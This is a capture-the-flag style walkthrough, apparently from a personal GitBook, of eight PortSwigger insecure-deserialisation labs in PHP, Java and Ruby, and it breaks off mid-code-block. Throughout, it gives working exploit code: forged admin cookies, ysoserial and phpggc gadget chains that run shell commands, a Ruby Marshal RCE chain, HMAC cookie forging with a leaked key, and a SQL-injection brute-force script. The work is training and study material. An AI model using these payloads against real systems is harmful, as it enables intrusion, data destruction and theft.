# Deserialization

### Lab 1: Modifying Serialised Objects <a href="#lab-1-modifying-serialised-objects" id="lab-1-modifying-serialised-objects"></a>

To solve this lab, become admin and delete carlos. When logged in as `wiener`, I saw this cookie being used:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-4734147f42fba190a3150b5ff6a429035c986b0a%252Fportswigger-deserial-writeup-image.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9db3583f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This cookie was a PHP serialised object, and it had an `admin` field for me to use.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

This particular cookie can be recreated using this PHP code:

```php
<?php

class User {
	public $username;
	public $admin;

	public function __construct($username, $admin) {
		$this->username = $username;
		$this->admin = $admin;
	}
}

	$wiener = new User("wiener", 1);
	$serial = serialize($wiener);
	echo $serial . "\n";
	echo "Exploit cookie: " . base64_encode($serial);
?>

#O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";i:1;}
#Exploit cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7aToxO30=
```

Afterwards, changing the cookie to the above value gives me access to the administrator panel.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-1afc36d1a97c10002ce9491d6bae14c6ac577601%252Fportswigger-deserial-writeup-image-1.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=10097d5b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Sending a GET request to `/admin/delete?username=carlos` should solve the lab.

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a7f00020427f666819734de00a40011'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'

cookies = {
	'session':'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7aToxO30='
}

requests.get(url + '/admin/delete?username=carlos', cookies=cookies, proxies=proxies, verify=False)
```

### Lab 2: Modifying Serialized Data Types <a href="#lab-2-modifying-serialized-data-types" id="lab-2-modifying-serialized-data-types"></a>

To solve this lab, delete `carlos` as the admin. This is the cookie upon logging in as `wiener`:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h5rawvf8xwxpxqo55oxqlqr3fenwyx6p";}
```

A bit more substantial. The hint is to abuse how PHP compares variables, and the `access_token` is a string type.

This might be a hint to abuse loose comparison.

![](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-c5733104f7299c6e29db0fa51f927d2f69870cf0%252Fportswigger-deserial-writeup-image-2.png%3Falt%3Dmedia\&width=768\&dpr=3\&quality=100\&sign=87ef566f\&sv=2)

So since this is a string, I can compare it to a `TRUE` value OR 0.

```php
<?php

class User {
	public $username;
	public $access_token;

	public function __construct($username, $access_token) {
		$this->username = $username;
		$this->access_token = $access_token;
	}
}

	$wiener = new User("administrator", 0);
	$serial = serialize($wiener);
	echo $serial . "\n";
	echo "Exploit cookie: " . base64_encode($serial);
?>
```

To solve lab:

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a7200b3044e90d3807f49a8004e0000'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'

cookies = {
	'session':'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ=='
}

requests.get(url + '/admin/delete?username=carlos', cookies=cookies, proxies=proxies, verify=False)
```

### Lab 3: Application Functionality Exploit <a href="#lab-3-application-functionality-exploit" id="lab-3-application-functionality-exploit"></a>

This lab uses deserialisation in the cookie. To solve the lab, delete `morale.txt` from `/home/carlos`. I was also given a backup account of `gregg:rosebud`, probably because I might have to delete an account.

There's a bit more functionality within this lab:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-b496bed33441fa760567c44069427f3a9593d4ca%252Fportswigger-deserial-writeup-image-3.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=229bb8f2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I uploaded a sample PNG, and then deleted my account. THis was the cookie sent in the POST request to `/my-account/delete`:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-e5e6cbbd14d2f8bc3771b0a57ffc0151d2903f01%252Fportswigger-deserial-writeup-image-4.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9c30ee47&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The `avatar_link` was a directory on the website. I can change this to `/home/carlos/morale.txt` and delete the backup account.

I intercepted the response and changed the cookie using this script:

```php
<?php

class User {
	public $username;
	public $access_token;
	public $avatar_link;

	public function __construct($username, $access_token, $avatar_link) {
		$this->username = $username;
		$this->access_token = $access_token;
		$this->avatar_link = $avatar_link;
	}
}

	$wiener = new User("gregg", 'b29u5o8d88pylon2d8p4umjk4dqdtnza', '/home/carlos/morale.txt');
	$serial = serialize($wiener);
	echo $serial . "\n";
	echo "Exploit cookie: " . base64_encode($serial);
?>
```

This solved the lab.

### Lab 4: Arbitrary Object Injection <a href="#lab-4-arbitrary-object-injection" id="lab-4-arbitrary-object-injection"></a>

I have to inject an object to this. To solve the lab, delete `/home/carlos/morale.txt`. In the page source, there was a mention of some source code:

![](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-f87506723eef9b529f114528e0f6ec49a814ef3d%252Fportswigger-deserial-writeup-image-5.png%3Falt%3Dmedia\&width=768\&dpr=3\&quality=100\&sign=e0cf200a\&sv=2)

The hint was to append a `~` to read editor-generated backup files, so visiting `/lib/CustomTemplate.php~` gave me source code:

```php
?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

For some reason, it calls `unlink` in `__destruct()`, meaning the PHP script automatically calls `unlink`. the only important variable is the `lock_file_path` one. Using this script can exploit this:

```php
<?php

class CustomTemplate {
	public $template_file_path;
	public $lock_file_path;

	public function __construct($template_file_path, $lock_file_path) {
		$this->template_file_path = $template_file_path;
		$this->lock_file_path = $lock_file_path;
	}
}

	$wiener = new CustomTemplate("/whatever", '/home/carlos/morale.txt');
	$serial = serialize($wiener);
	echo $serial . "\n";
	echo "Exploit cookie: " . base64_encode($serial);
?>
```

Replace the output as the cookie, and send a request to the website to solve the lab.

### Lab 5: Java Deserialisation with Apache Commons <a href="#lab-5-java-deserialisation-with-apache-commons" id="lab-5-java-deserialisation-with-apache-commons"></a>

Java deserialisation means `ysoserial` is required. To solve the lab, delete `morale.txt`.

The cookie for this lab is no longer PHP based.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-018490336b88c5393eec810dcc2bfb880d21080f%252Fportswigger-deserial-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=645a9e43&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This is a `CommonsCollections4` payload. First, generate the payload:

```bash
$ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' |base64
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh
cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u
<TRUNCATED>
```

Afterwards, replace the session cookie with the output and URL encode it to solve the lab.

```python
import requests
import subprocess
import base64
from urllib.parse import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a76004f03a1396c80f70d89000d00e7'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
payload = 'CommonsCollections4'
cmd = 'rm /home/carlos/morale.txt'

command = 'java -jar ysoserial.jar {} "{}"'.format(payload, cmd)
result_bytes = subprocess.run(command, shell=True, capture_output=True).stdout
encoded_payload = base64.b64encode(result_bytes).decode('utf-8').strip()
encoded_payload_url = quote(encoded_payload)
cookies = {
	'session':encoded_payload_url
}
requests.get(url + '/my-account?id=wiener', cookies=cookies, proxies=proxies, verify=False)
```

### Lab 6: PHP Gadget Chains <a href="#lab-6-php-gadget-chains" id="lab-6-php-gadget-chains"></a>

This lab uses a signed cookie, and a common PHP framework. There is no source code, but there are pre-built gadget chains. To solve the lab, delete `/home/carlos/morale.txt`.

The cookie looks rather different:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-aa0cc32180802dea46dc939166fa9b91dadcf793%252Fportswigger-deserial-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=b6893da4&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Here's the cookie:

```bash
$ echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwMm16dThrajNreTZ1aW5jYXEzb3Rzc2NzZ2kxYjZoYyI7fQ==' | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"p2mzu8kj3ky6uincaq3otsscsgi1b6hc";}
```

Within the page source, there's a comment:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-d1d2db7130489855908e58f5102f3a19c4685148%252Fportswigger-deserial-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=3d5ec9e&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This page is the `pphinfo.php` page, and there's a `SECRET_KEY` variable:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a28319f4bee7fa3cb19c8c4c4d15500d50d40243%252Fportswigger-deserial-writeup-image-9.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c5f2ee12&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Sending a modified cookie results in this error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-c832df2245a539b1a26ed2cc57d531f780bb9c04%252Fportswigger-deserial-writeup-image-10.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=993a5e0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So this uses Symfony and I have a secret key. This means I probably have to use `phpggc` to generate my payload since gadget chains have to be exploited.

Using `symfony/rce4` gives me the same version that the website is running:

```bash
$ phpggc -i symfony/rce4 
Name           : Symfony/RCE4
Version        : 3.4.0-34, 4.2.0-11, 4.3.0-7
Type           : RCE (Function call)
Vector         : __destruct
Informations   : 
Execute $function with $parameter (CVE-2019-18889)

./phpggc Symfony/RCE4 <function> <parameter>
```

Using this, I can generate a `base64` encoded payload.

```bash
$ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

Now, I need to fit this into my cookie. Since I am given the `SECRET_KEY` variable from earlier, I can sign and forge any cookies.

```python
import requests
import subprocess
import hmac
import hashlib
from urllib.parse import quote
import json
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0acf00ea04152dad80bdda8f00110047'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="
key = "d2fxzcoucq4q9tu02ohy515fdr5uyha4"

signature = hmac.new(bytes(key, "UTF-8"), payload.encode(), hashlib.sha1).hexdigest()


json_cookie = json.dumps({"token": payload, "sig_hmac_sha1": signature})
encoded_payload = quote(json_cookie)

cookies = {
	'session':encoded_payload
}

r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
```

This solves the lab.

### Lab 7: Ruby Gadget Chain <a href="#lab-7-ruby-gadget-chain" id="lab-7-ruby-gadget-chain"></a>

This lab uses the Ruby on Rails framework, and there are documented exploits to enable RCE via a gadget chain. To solve the lab, delete `/home/carlos/morale.txt`.

Sending a malformed cookie results in a Ruby error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-f8bc36538bab7b6c4b70eed7a4d3e4cdc7a09d53%252Fportswigger-deserial-writeup-image-11.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=13476f90&#x26;sv=2" alt=""><figcaption></figcaption></figure>

When searching for exploits, I found this:

[Round Two: An Updated Universal Deserialisation Gadget for Ruby 2.x-3.xdevcraft.io](https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

Here's the edited final script:

```ruby
require "base64"
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

I ran this here:

[![Logo](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2Fwww.jdoodle.com%2Ffavicon.ico\&width=20\&dpr=3\&quality=100\&sign=3e10065b\&sv=2)JDoodle - Online Compiler, Editor for Java, C/C++, etcwww.jdoodle.com](https://www.jdoodle.com/execute-ruby-online)

This gave me this as the output:

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

URL encode this and set it as the cookie. Sending a request would solve the lab.

### Lab 8: Custom Java Gadget Chain <a href="#lab-8-custom-java-gadget-chain" id="lab-8-custom-java-gadget-chain"></a>

This lab requires me to exploit insecure deserialisation to obtain the administrator's password, then delete `carlos`.

There's a comment in the page source:

![](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-c97ec87c84a720724ccf77f994eabd6ada9e69d8%252Fportswigger-deserial-writeup-image-12.png%3Falt%3Dmedia\&width=768\&dpr=3\&quality=100\&sign=56d32df7\&sv=2)

Viewing `/backup` shows two files:

![](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-d4556cff4b0eb64ae52939d67a9dced810d0bc0b%252Fportswigger-deserial-writeup-image-13.png%3Falt%3Dmedia\&width=768\&dpr=3\&quality=100\&sign=1bd57be8\&sv=2)

Here's the source for `AccessTokenUser.java`:

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

And here's the other source code:

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

PortSwigger has provided a simple Java program for serialising objects on Github and `replit`.

[![Logo](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png\&width=20\&dpr=3\&quality=100\&sign=47a2bb4d\&sv=2)GitHub - PortSwigger/serialization-examplesGitHub](https://github.com/PortSwigger/serialization-examples)

#### Code Analysis -> Create Object <a href="#code-analysis-greater-than-create-object" id="code-analysis-greater-than-create-object"></a>

Starting with `ProductTemplate`, the class has a string variable of `id`. This `id` variable is passed to a SQL query:

```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

The `id` parameter is not sanitised, and I can try to create a Java program to set it to `'` to escape the query. Firstly, I need to create a serialised object for `ProductTemplate`.

Here are the variables and constructor for `ProductTemplate`, which need to be copied over.

```php
static final long serialVersionUID = 1L;

private final String id;
private transient Product product;

public ProductTemplate(String id)
{
	this.id = id;
}
```

Note that it uses a `Product` variable. Since I do not actually care about the `product` variable, this class can be empty:

```php
package data.productcatalog;

public class Product {

}
```

Note that the original code packages it as **`data.productcatalog`**, so create a package like so:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-40a71deb8f9a826c1379069ae6e1f057811243bf%252Fportswigger-deserial-writeup-image-14.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c5fe1b69&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Afterwards, use `package.productcatalog` to package it as per the source code.

Here's the code I used:

```python
import data.productcatalog.ProductTemplate;
class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("'");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized data ID: " + deserializedObject.getId());
    }

// CLASSES USED

// Product class
package data.productcatalog;
public class Product {
}

// ProductTemplate class
package data.productcatalog;
import java.io.Serializable;
public class ProductTemplate implements Serializable {
    static final long serialVersionUID = 1L;
    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

This program outputs this:

```
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
Deserialized data ID: '
```

The above can be sent into the website, and I will receive an SQL error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a51d6a626b5cd9aa0912124da7204ec58ce1d664%252Fportswigger-deserial-writeup-image-15.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9f285c01&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This means we have effectively injected parameters into the SQL query, and confirmed the SQL Injection vulnerability.

#### SQL Injection via Deserialisation <a href="#sql-injection-via-deserialisation" id="sql-injection-via-deserialisation"></a>

Now, I can proceed to enumerate the database. Since I want to extract data, `UNION` injection must be used.

For this, I modified the Java code to take user input, and then built the `.jar`:

```
ProductTemplate originalObject = new ProductTemplate(args[0]);
```

Now, I can try to automate this testing. I know that the database uses PostgreSQL from the source code, so I can begin to find the number of columns.

Using a payload of `' UNION SELECT NULL--` resulted in this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-98675ba18d7ca78f7206f0580c2ed288a00bb70f%252Fportswigger-deserial-writeup-image-16.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=7cb251f1&#x26;sv=2" alt=""><figcaption></figcaption></figure>

From this, I can begin to brute force the number of columns. I wasn't sure how big it was going to be, so I scripted the process:

```python
import requests
import subprocess
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0ae700990366a1ee80b5ee5f005f00ac'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'

null_payload = ',NULL'
while True:
	
	payload = f'"\' UNION SELECT NULL{null_payload}--"'
	command = f'java -jar Test.jar {payload}'

	result = subprocess.run(command, shell=True, capture_output=True).stdout.decode('utf-8')
	match = re.search(r'Serialized object: ([a-zA-Z0-9]+)', result)
	if not match:
		print('[-] Error serializing')
		exit()
	serialised_cookie = match[1]
	cookies = {
		'session': serialised_cookie
	}

	r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
	if 'UNION query must have the same number of columns' not in r.text:
		print(f'[+] Payload: {payload}')
		exit()
	null_payload += ',NULL'
```

This returned this payload:

```sql
